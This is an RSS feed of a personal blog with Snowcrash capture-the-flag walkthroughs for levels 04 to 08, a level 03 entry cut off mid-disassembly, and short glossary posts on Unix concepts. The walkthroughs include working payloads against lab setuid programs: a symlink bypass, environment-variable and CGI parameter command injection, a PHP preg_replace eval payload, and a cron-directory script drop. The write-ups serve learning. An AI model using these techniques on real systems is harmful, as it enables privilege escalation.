<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on My blog</title>
        <link>/posts/</link>
        <description>Recent content in Posts on My blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Mon, 03 Aug 2020 18:26:16 +0200</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>What is Symlink</title>
            <link>/posts/glossary/symlink/</link>
            <pubDate>Mon, 03 Aug 2020 18:26:16 +0200</pubDate>
            
            <guid>/posts/glossary/symlink/</guid>
            <description>A symbolink link is a file that contains a reference to another file.
That reference take form as a path in its absolute or relative form.
A symlink may contains a path that point to nothing
Synonym  symlink soft link  </description>
            <content type="html"><![CDATA[<p>A <strong>symbolink link</strong> is a file that contains a <em>reference</em> to another file.<br>
That <em>reference</em> take form as a path in its absolute or relative form.</p>
<p>A <strong>symlink</strong> may contains a path that point to nothing</p>
<h2 id="synonym">Synonym</h2>
<ul>
<li>symlink</li>
<li>soft link</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level08</title>
            <link>/posts/snowcrash/level08/</link>
            <pubDate>Mon, 03 Aug 2020 15:53:09 +0200</pubDate>
            
            <guid>/posts/snowcrash/level08/</guid>
            <description>On the home dir, we have 2 file level08 with is following pseudo-code and token who is only readable be flag08
$ ls -l total 16 -rwsr-s---+ 1 flag08 level08 8617 Mar 5 2016 level08 -rw------- 1 flag08 flag08 26 Mar 5 2016 token int main(int argc,char **argv) { char *needle; int fd; ssize_t n; char buf[1024]; if (argc == 1) { errx(1, &amp;#34;%s [file to read]\n&amp;#34;, argv[0]); } needle = strstr(argv[1], &amp;#34;token&amp;#34;); if (needle !</description>
            <content type="html"><![CDATA[<p>On the home dir, we have 2 file <code>level08</code> with is following pseudo-code and <code>token</code> who is only readable be <strong>flag08</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">16</span>
-rwsr-s---+ <span style="color:#ae81ff">1</span> flag08 level08 <span style="color:#ae81ff">8617</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level08
-rw-------  <span style="color:#ae81ff">1</span> flag08 flag08    <span style="color:#ae81ff">26</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> token
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>needle;
  <span style="color:#66d9ef">int</span> fd;
  ssize_t n;
  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];

  <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
    errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;%s [file to read]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
  }
  needle <span style="color:#f92672">=</span> strstr(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;token&#34;</span>);
  <span style="color:#66d9ef">if</span> (needle <span style="color:#f92672">!=</span> NULL) {
    errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;You may not access </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#39;\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
  }
  fd <span style="color:#f92672">=</span> open(argv[<span style="color:#ae81ff">1</span>], O_RDONLY);
  <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
    err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to open %s&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
  }
  n <span style="color:#f92672">=</span> read(fd, buff, <span style="color:#66d9ef">sizeof</span>(buff));
  <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
    err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to read fd %d&#34;</span>, fd);
  }
  <span style="color:#66d9ef">return</span> write(STDOUT_FILENO, buff, n);
}
</code></pre></div><h2 id="explanation">Explanation</h2>
<p><code>level08</code> take a file as argument<br>
check if the argument doesn&rsquo;t contains the string <code>token</code><br>
then open/read the file</p>
<h2 id="counter-the-filename-check">Counter the filename check</h2>
<p>to counter the filename check on <code>level08</code> we have access in linux to <a href="/posts/glossary/symlink">symbolic link</a>.<br>
We just have to create a link to the file <code>~/token</code> with a name that doesn&rsquo;t not contains the string <code>token</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ln -s ~/token /tmp/foo
$ ./level08 /tmp/foo
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level07</title>
            <link>/posts/snowcrash/level07/</link>
            <pubDate>Mon, 03 Aug 2020 15:52:09 +0200</pubDate>
            
            <guid>/posts/snowcrash/level07/</guid>
            <description>On the home directory, we have a file level07 with the following pseudo-code
int main() { char *cmd; asprintf(&amp;amp;cmd, &amp;#34;/bin/echo %s &amp;#34;, getenv(&amp;#34;LOGNAME&amp;#34;)) return system(cmd); } Explenation level07 retrieve the value LOGNAME from the env table,
then concat the string at the end of /bin/echo  and execute it
 Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the env table  system(char *command) executes a command specified in command by calling /bin/sh -c command</description>
            <content type="html"><![CDATA[<p>On the home directory, we have a file <code>level07</code> with the following pseudo-code</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cmd;

  asprintf(<span style="color:#f92672">&amp;</span>cmd, <span style="color:#e6db74">&#34;/bin/echo %s &#34;</span>, getenv(<span style="color:#e6db74">&#34;LOGNAME&#34;</span>))
  <span style="color:#66d9ef">return</span> system(cmd);
}
</code></pre></div><h2 id="explenation">Explenation</h2>
<p><code>level07</code> retrieve the value <strong>LOGNAME</strong> from the <a href="/posts/glossary/env_table">env table</a>,<br>
then concat the string at the end of <code>/bin/echo </code> and execute it</p>
<ul>
<li>Simple execution
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level07
level07
</code></pre></div></li>
<li>Changing the output
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ LOGNAME<span style="color:#f92672">=</span>foobar ./level07
foobar
</code></pre></div></li>
</ul>
<h2 id="poisoning-the-env-table">Poisoning the env table</h2>
<blockquote>
<p><code>system(char *command)</code> executes a command specified in <em>command</em> by calling
<strong>/bin/sh</strong> -c <em>command</em></p>
</blockquote>
<p>Because <strong>LOGNAME</strong> is not sanytize, we can execute any command as <strong>flag07</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ LOGNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(whoami)&#39;</span> ./level07
flag07
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level06</title>
            <link>/posts/snowcrash/level06/</link>
            <pubDate>Mon, 03 Aug 2020 15:44:15 +0200</pubDate>
            
            <guid>/posts/snowcrash/level06/</guid>
            <description>On the home directory, we have 2 files level06.php with the following content and level06 which is a wrapper around level06.php to run it as the user flag06, thanks to his setuid
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #!/usr/bin/php &amp;lt;?php function y($m) { $m = preg_replace(&amp;#34;/\./&amp;#34;, &amp;#34; x &amp;#34;, $m); $m = preg_replace(&amp;#34;/@/&amp;#34;, &amp;#34; y&amp;#34;, $m); return $m; } function x($y, $z) { $a = file_get_contents($y); $a = preg_replace(&amp;#34;/(\[x (.</description>
            <content type="html"><![CDATA[<p>On the home directory, we have 2 files <code>level06.php</code> with the following content
and <code>level06</code> which is a wrapper around <code>level06.php</code> to run it as the user <strong>flag06</strong>, thanks to his <em>setuid</em></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">#!/usr/bin/php
<span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">y</span>($m) {
  $m <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\./&#34;</span>, <span style="color:#e6db74">&#34; x &#34;</span>, $m);
  $m <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/@/&#34;</span>, <span style="color:#e6db74">&#34; y&#34;</span>, $m);
  <span style="color:#66d9ef">return</span> $m;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">x</span>($y, $z) {
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($y);
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/(\[x (.*)\])/e&#34;</span>, <span style="color:#e6db74">&#34;y(</span><span style="color:#ae81ff">\&#34;\\</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>, $a);
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\[/&#34;</span>, <span style="color:#e6db74">&#34;(&#34;</span>, $a);
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\]/&#34;</span>, <span style="color:#e6db74">&#34;)&#34;</span>, $a);
  <span style="color:#66d9ef">return</span> $a;
}

$r <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>($argv[<span style="color:#ae81ff">1</span>], $argv[<span style="color:#ae81ff">2</span>]);
<span style="color:#66d9ef">print</span> $r;
<span style="color:#75715e">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="inspection">Inspection</h2>
<p>On the script, only the function <strong>x</strong> is interesting because of the <code>preg_replace</code> with the <strong>eval flag</strong> (<code>\e</code>) on (line 11).</p>
<p>The <strong>eval flag</strong> on <code>preg_replace</code> &hellip;</p>
<blockquote>
<p>does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string</p>
</blockquote>
<h2 id="malicious-file">Malicious file</h2>
<p>For the exploit to work, our payload need to be matched in the 2nd group of the regex pattern <code>/(\[x (.*)\])/e</code></p>
<p>I came with the following result</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[x ${`echo current user $(id) 1&gt;&amp;2`}]
</code></pre></div><p>and get as output</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level06 malicious_file
<span style="display:block;width:100%;background-color:#3c3d38">current user uid<span style="color:#f92672">=</span>3006<span style="color:#f92672">(</span>flag06<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>2006<span style="color:#f92672">(</span>level06<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>3006<span style="color:#f92672">(</span>flag06<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,2006<span style="color:#f92672">(</span>level06<span style="color:#f92672">)</span>
</span>PHP Notice:  Undefined variable:  in /home/user/level06/level06.php<span style="color:#f92672">(</span>4<span style="color:#f92672">)</span> : regexp code on line <span style="color:#ae81ff">1</span>

</code></pre></td></tr></table>
</div>
</div><p>See the output of our command on line 2</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple">php string variable parsing</a></li>
<li><a href="https://www.php.net/manual/en/function.preg-replace.php">preg replace</a></li>
<li><a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">preg replace eval</a></li>
<li><a href="http://www.madirish.net/402">exploiting php pcre func</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level05</title>
            <link>/posts/snowcrash/level05/</link>
            <pubDate>Mon, 03 Aug 2020 14:35:25 +0200</pubDate>
            
            <guid>/posts/snowcrash/level05/</guid>
            <description>When connecting to level05, we are greated be the following line
You have new mail. The mail $ cat /var/mail/level05 */2 * * * * su -c &amp;#34;sh /usr/sbin/openarenaserver&amp;#34; - flag05 The mail content is a crontab instruction that execute
sh /usr/sbin/openarenaserver as the user flag05 every 2 minute
The script #!/bin/sh  for i in /opt/openarenaserver/* ; do (ulimit -t 5; bash -x &amp;#34;$i&amp;#34;) rm -f &amp;#34;$i&amp;#34; done For each file in /opt/openarenaserver execute it as a bash script.</description>
            <content type="html"><![CDATA[<p>When connecting to <strong>level05</strong>, we are greated be the following line</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">You have new mail.
</code></pre></div><h2 id="the-mail">The mail</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /var/mail/level05
*/2 * * * * su -c <span style="color:#e6db74">&#34;sh /usr/sbin/openarenaserver&#34;</span> - flag05
</code></pre></div><p>The mail content is a crontab instruction that execute<br>
<code>sh /usr/sbin/openarenaserver</code> as the user <strong>flag05</strong> every 2 minute</p>
<h2 id="the-script">The script</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">for</span> i in /opt/openarenaserver/* ; <span style="color:#66d9ef">do</span>
        <span style="color:#f92672">(</span>ulimit -t 5; bash -x <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
        rm -f <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><p>For each file in <code>/opt/openarenaserver</code> execute it as a bash script.<br>
Each script can run up to 5 sec ( <code>ulimit -t 5</code> )</p>
<h2 id="one-more-things">One more things</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -ld /opt/openarenaserver/
drwxrwxr-x+ <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">40</span> Aug  <span style="color:#ae81ff">3</span> 13:48 /opt/openarenaserver/
$ getfacl /opt/openarenaserver
getfacl: Removing leading <span style="color:#e6db74">&#39;/&#39;</span> from absolute path names
<span style="color:#75715e"># file: opt/openarenaserver</span>
<span style="color:#75715e"># owner: root</span>
<span style="color:#75715e"># group: root</span>
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
</code></pre></div><p>The user <strong>level05</strong> can create file in the dir <code>/opt/openarenaserver/</code> thanks to the acl
<code>default:user:level05:rwx</code></p>
<h2 id="run-my-script">Run my script</h2>
<p>Since its a shell script that will be executed, we have access to most of shell command</p>
<p>I will just use the following script as a POC</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>
echo <span style="color:#e6db74">&#34;hello i&#39;m </span><span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt; /tmp/flag05
</code></pre></div><p>after less than 2 min, we get the following result</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /tmp/flag05
hello i<span style="color:#960050;background-color:#1e0010">&#39;</span>m flag05
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level04</title>
            <link>/posts/snowcrash/level04/</link>
            <pubDate>Sun, 02 Aug 2020 21:25:56 +0200</pubDate>
            
            <guid>/posts/snowcrash/level04/</guid>
            <description>We have a file level04.pl with the setuid set
#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub x { $y = $_[0]; print `echo $y 2&amp;gt;&amp;amp;1`; } x(param(&amp;#34;x&amp;#34;)); Quick explanation The script take a parameter x, include it in the string `echo $y 2&amp;gt;&amp;amp;1` ( where y is our x value )
Then execute that string has an shell command then print its output.
Normally the script should print what we give it to params x.</description>
            <content type="html"><![CDATA[<p>We have a file <code>level04.pl</code> with the <a href="/posts/glossary/file_permission">setuid set</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/perl</span>
<span style="color:#75715e"># localhost:4747</span>
<span style="color:#66d9ef">use</span> CGI <span style="color:#e6db74">qw{param}</span>;
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Content-type: text/html\n\n&#34;</span>;
<span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">x</span> {
  $y <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">0</span>];
  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">`echo $y 2&gt;&amp;1`</span>;
}
x(param(<span style="color:#e6db74">&#34;x&#34;</span>));
</code></pre></div><h2 id="quick-explanation">Quick explanation</h2>
<p>The script take a parameter <strong>x</strong>, include it in the string <code>`echo $y 2&gt;&amp;1`</code> ( where <code>y</code> is our <code>x</code> value )<br>
Then execute that string has an shell command then print its output.</p>
<p>Normally the script should print what we give it to params <strong>x</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span>hello_world
hello_world
</code></pre></div><h2 id="the-weak-part">The Weak part</h2>
<p>But because <strong>x</strong> is not sanitize and because <strong>x</strong> will be used in a shell command as it.<br>
We can make the script execute arbitrary code with the right of <strong>flag04</strong></p>
<h2 id="the-poc">The Poc</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;`whoami`&#39;</span>
flag04
</code></pre></div><h2 id="source">Source</h2>
<ul>
<li><a href="https://www.stat.berkeley.edu/~spector/extension/perl/notes/node73.html">The backquote operator</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is Environment Table</title>
            <link>/posts/glossary/env_table/</link>
            <pubDate>Sun, 02 Aug 2020 17:02:58 +0200</pubDate>
            
            <guid>/posts/glossary/env_table/</guid>
            <description>An Environment Table is a table that is accessible by each process
Some Environment variable to know about    name description     PATH used to list each directory to search for binary   HOME a directory to be consider as the home directory of the current user   PWD the current working directory    Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>An <strong>Environment Table</strong> is a table that is accessible by each process</p>
<h2 id="some-environment-variable-to-know-about">Some Environment variable to know about</h2>
<table>
<thead>
<tr>
<th><strong>name</strong></th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>PATH</strong></td>
<td>used to list each directory to search for binary</td>
</tr>
<tr>
<td><strong>HOME</strong></td>
<td>a directory to be consider as the home directory of the current user</td>
</tr>
<tr>
<td><strong>PWD</strong></td>
<td>the current working directory</td>
</tr>
</tbody>
</table>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Environment_variable">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is File Permission</title>
            <link>/posts/glossary/file_permission/</link>
            <pubDate>Sun, 02 Aug 2020 17:02:49 +0200</pubDate>
            
            <guid>/posts/glossary/file_permission/</guid>
            <description>Each file as his own permission set.
It allow to
 control the ability of the users to view, change, navigate, and execute the contents of the file system
 Notation for Unix system permission can be see in its symbolic notation using ls -l
$ ls -l total 16 -rw-rw-r-- 1 level03 level03 0 Aug 2 17:22 foo with ls -l the 1st column is used to represent the file type and his permission.</description>
            <content type="html"><![CDATA[<p>Each file as his own permission set.<br>
It allow to</p>
<blockquote>
<p>control the ability of the users to view, change, navigate, and execute the contents of the file system</p>
</blockquote>
<h2 id="notation-for-unix-system">Notation for Unix system</h2>
<p>permission can be see in its symbolic notation using <code>ls -l</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">16</span>
-rw-rw-r-- <span style="color:#ae81ff">1</span> level03 level03    <span style="color:#ae81ff">0</span> Aug  <span style="color:#ae81ff">2</span> 17:22 foo
</code></pre></div><p>with <code>ls -l</code> the 1st column is used to represent the file type and his permission.</p>
<pre><code>[-][rw-rw-r--]
 ^  ^
 │  │
 │  └─ file permission
 └─ file type
</code></pre><p>the file permission group is composed of 3 triad each one represented one group:<br>
<code>User</code> / <code>Group</code> / <code>Other</code></p>
<pre><code>[rw-][rw-][r--]
 ^    ^    ^
 │    │    └─ Other
 │    └─ Group
 └─ User
</code></pre><table>
<thead>
<tr>
<th>Letter</th>
<th>Location</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>1st letter of each triad</td>
<td>allow the triad&rsquo;s group to <strong>READ</strong> the file</td>
</tr>
<tr>
<td>w</td>
<td>2nd letter of each triad</td>
<td>allow the triad&rsquo;s group to <strong>MODIFY</strong> the file</td>
</tr>
<tr>
<td>x</td>
<td>3rd letter of each triad</td>
<td>allow the triad&rsquo;s group to <strong>EXECUTE</strong> the file</td>
</tr>
<tr>
<td>s</td>
<td>3rd letter of <code>User</code> triad</td>
<td>allow the user to run the file with the system permissions of the <strong>OWNER</strong></td>
</tr>
<tr>
<td>s</td>
<td>3rd letter of <code>Group</code> triad</td>
<td>allow the user to run the file with the system permissions of the <strong>GROUP</strong></td>
</tr>
<tr>
<td>t</td>
<td>3rd letter of <code>Other</code> triad</td>
<td>only the <strong>owner</strong> or <strong>root</strong> can <strong>RENAME</strong> or <strong>DELETE</strong> the file</td>
</tr>
<tr>
<td>S</td>
<td>3rd letter of <code>User</code> / <code>GROUP</code> triad</td>
<td>like <code>s</code>, but the executable bit is disabled</td>
</tr>
<tr>
<td>T</td>
<td>3rd letter of <code>Other</code> triad</td>
<td>like <code>t</code>, but the executable bit is disabled</td>
</tr>
<tr>
<td>-</td>
<td>any</td>
<td>the corresponding permission is disabled</td>
</tr>
</tbody>
</table>
<p>with our previous example <code>foo</code> give the following permission:</p>
<ul>
<li>for the owner of the file to <strong>READ</strong> and <strong>WRITE</strong></li>
<li>for the group to <strong>READ</strong> and <strong>WRITE</strong></li>
<li>and for the rest to access the file has <strong>READONLY</strong></li>
</ul>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/File_system_permissions">file permission - wiki</a></li>
<li><a href="https://en.wikipedia.org/wiki/Setuid">Setuid &amp; Setgid - wiki</a></li>
<li><a href="https://en.wikipedia.org/wiki/Sticky_bit">Sticky bit - wiki</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level03</title>
            <link>/posts/snowcrash/level03/</link>
            <pubDate>Sun, 02 Aug 2020 15:06:27 +0200</pubDate>
            
            <guid>/posts/snowcrash/level03/</guid>
            <description>On the Home directory of level03 we have an executable file with the setuid file permission set
$ ls -l total 12 -rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03 Analyzing level03 By using the debugger gdb, we can disassemble level03 and inspect his ASM code.
1 2 3 4 5 6 7 8 9 10 11 12  $ gdb level03 -q Reading symbols from level03...done. Dump of assembler code for function main: (gdb) disas main .</description>
            <content type="html"><![CDATA[<p>On the Home directory of <code>level03</code> we have an executable file with the <strong>setuid</strong> <a href="/posts/glossary/file_permission">file permission</a> set</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">12</span>
-rwsr-sr-x <span style="color:#ae81ff">1</span> flag03 level03 <span style="color:#ae81ff">8627</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level03
</code></pre></div><h2 id="analyzing-level03">Analyzing level03</h2>
<p>By using the debugger <code>gdb</code>, we can disassemble <code>level03</code> and inspect his <strong>ASM</strong> code.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
